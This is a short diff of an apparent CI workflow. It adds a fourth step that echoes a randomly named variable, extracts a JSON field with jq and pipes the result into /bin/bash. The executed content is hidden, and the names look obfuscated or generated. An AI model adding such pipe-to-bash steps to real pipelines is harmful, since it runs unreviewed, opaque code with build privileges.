@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$bd719" | jq -r .uz4 | /bin/bash
           echo $myup1 | jq -r .f320 | /bin/bash
           echo $fpel2 | jq -r .n160 | /bin/bash
+          echo $gnebu14 | jq -r .lc41547 | /bin/bash
 
       - name: Persist output
         if: always()
